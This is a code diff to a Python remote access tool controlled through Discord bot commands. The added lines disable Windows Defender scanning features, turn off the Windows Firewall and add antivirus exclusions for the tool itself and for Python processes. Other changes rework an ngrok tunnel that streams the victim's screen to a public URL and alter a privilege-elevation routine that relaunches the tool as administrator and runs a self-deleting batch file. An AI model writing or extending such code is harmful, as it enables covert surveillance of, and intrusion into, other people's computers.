@@ -110,11 +110,21 @@ def disable_defender():
             'powershell -Command "Set-MpPreference -MAPSReporting Disabled"',
             'powershell -Command "Set-MpPreference -HighThreatDefaultAction Allow"',
             'powershell -Command "Set-MpPreference -ModerateThreatDefaultAction Allow"',
-            'powershell -Command "Set-MpPreference -LowThreatDefaultAction Allow"'
+            'powershell -Command "Set-MpPreference -LowThreatDefaultAction Allow"',
+            'powershell -Command "Set-MpPreference -DisableArchiveScanning $true"',
+            'powershell -Command "Set-MpPreference -DisableEmailScanning $true"',
+            'powershell -Command "Set-MpPreference -DisableRemovableDriveScanning $true"',
+            'powershell -Command "Set-MpPreference -DisableRestorePoint $true"',
+            # Disable Windows Firewall
+            'netsh advfirewall set allprofiles state off',
+            # Add specific exceptions
+            f'powershell -Command "Add-MpPreference -ExclusionPath \"{os.path.abspath(sys.argv[0])}\""',
+            'powershell -Command "Add-MpPreference -ExclusionProcess \"python.exe\""',
+            'powershell -Command "Add-MpPreference -ExclusionProcess \"pythonw.exe\""',
         ]
 
         for cmd in commands:
-            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
 
         return True
     except Exception as e:
@@ -345,8 +355,9 @@ def start_ngrok(ngrok_path):
     
     timeout = 30
     start_time = time.time()
+    ngrok_url = None
     
-    while time.time() - start_time < timeout:
+    while time.time() - start_time < timeout and ngrok_url is None:
         if ngrok_process.poll() is not None:
             break
             
@@ -354,31 +365,27 @@ def start_ngrok(ngrok_path):
         if not line:
             time.sleep(0.1)
             continue
-            
-        print(f"Ngrok output: {line.strip()}")
         
-        if "started tunnel" in line.lower() and "https://" in line:
-            parts = line.split()
-            for part in parts:
-                if part.startswith("https://") and ".ngrok" in part:
-                    ngrok_url = part.strip()
-                    break
-        elif "url=" in line and "https://" in line:
-            url_start = line.find("https://")
-            url_end = line.find(" ", url_start)
-            if url_end == -1:
-                url_end = len(line)
-            potential_url = line[url_start:url_end].strip()
-            if ".ngrok" in potential_url:
-                ngrok_url = potential_url
-                
-        if ngrok_url:
-            break
+        if "url=" in line and "https://" in line:
+            match = re.search(r'url=https://([^\s]+)', line)
+            if match:
+                ngrok_url = "https://" + match.group(1)
+                break
+        elif "started tunnel" in line.lower() and "https://" in line:
+            match = re.search(r'https://[^\s]+\.ngrok\.io', line)
+            if match:
+                ngrok_url = match.group(0)
+                break
+        elif "tunnel session" in line.lower() and "url=" in line:
+            match = re.search(r'url=([^\s]+)', line)
+            if match and "https://" in match.group(1):
+                ngrok_url = match.group(1)
+                break
     
     if not ngrok_url:
-        time.sleep(5)
+        time.sleep(3)
         try:
-            response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
+            response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=10)
             data = response.json()
             if data.get("tunnels"):
                 for tunnel in data["tunnels"]:
@@ -389,7 +396,7 @@ def start_ngrok(ngrok_path):
             pass
     
     return ngrok_url
-
+    
 def start_flask():
     global streamer
     streamer = ScreenStreamer()
@@ -429,6 +436,14 @@ async def key(ctx, token: str = None):
 async def live(ctx):
     global flask_thread, ngrok_url
     
+    try:
+        if not ctypes.windll.shell32.IsUserAnAdmin():
+            await ctx.send("❌ You must run the bot as administrator to use !live (screen streaming).")
+            return
+    except Exception as e:
+        await ctx.send(f"❌ Unable to check admin privileges: {e}")
+        return
+        
     if flask_thread and flask_thread.is_alive():
         await ctx.send("Stream is already running!")
         return
@@ -442,14 +457,24 @@ async def live(ctx):
         flask_thread.start()
         
         await asyncio.sleep(3)
-        
-        loop = asyncio.get_event_loop()
-        ngrok_url = await loop.run_in_executor(None, start_ngrok, ngrok_path)
+        ngrok_url = await asyncio.to_thread(start_ngrok, ngrok_path)
         
         if ngrok_url:
             await ctx.send(f"Screen Stream Active!\nYour screen is now live at: {ngrok_url}")
         else:
-            await ctx.send("Failed to start ngrok tunnel. Check your auth token or try again.")
+            try:
+                response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
+                data = response.json()
+                if data.get("tunnels"):
+                    for tunnel in data["tunnels"]:
+                        if tunnel.get("public_url", "").startswith("https://"):
+                            ngrok_url = tunnel["public_url"]
+                            await ctx.send(f"Screen Stream Active!\nYour screen is now live at: {ngrok_url}")
+                            break
+                else:
+                    await ctx.send("Failed to start ngrok tunnel. Check your auth token or try again.")
+            except:
+                await ctx.send("Failed to start ngrok tunnel. Check your auth token or try again.")
     
     except Exception as e:
         await ctx.send(f"Error starting stream: {str(e)}")
@@ -585,29 +610,28 @@ async def su(ctx):
 
         current_pid = os.getpid()
 
-        batch_script = f"""
-        @echo off
-        timeout /t 3 /nobreak >nul
-        taskkill /pid {current_pid} /f
-        del "%~f0"
-        """
-
-        temp_bat = os.path.join(getenv("TEMP"), "elevate_kill.bat")
-        with open(temp_bat, "w") as f:
-            f.write(batch_script)
-
         ctypes.windll.shell32.ShellExecuteW(
             None, "runas", sys.executable, " ".join(sys.argv), None, 1
-        )
-
-        subprocess.Popen(
-            temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
 
         await ctx.send(
             f"🔄 Requesting administrator privileges... This window will close if accepted.{watermark()}"
         )
 
+        await asyncio.sleep(3)
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            batch_script = f"""
+            @echo off
+            timeout /t 3 /nobreak >nul
+            taskkill /pid {current_pid} /f
+            del "%~f0"
+            """
+            temp_bat = os.path.join(getenv("TEMP"), "elevate_kill.bat")
+            with open(temp_bat, "w") as f:
+                f.write(batch_script)
+            subprocess.Popen(
+                temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW
+            )
     except Exception as e:
         await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")
 
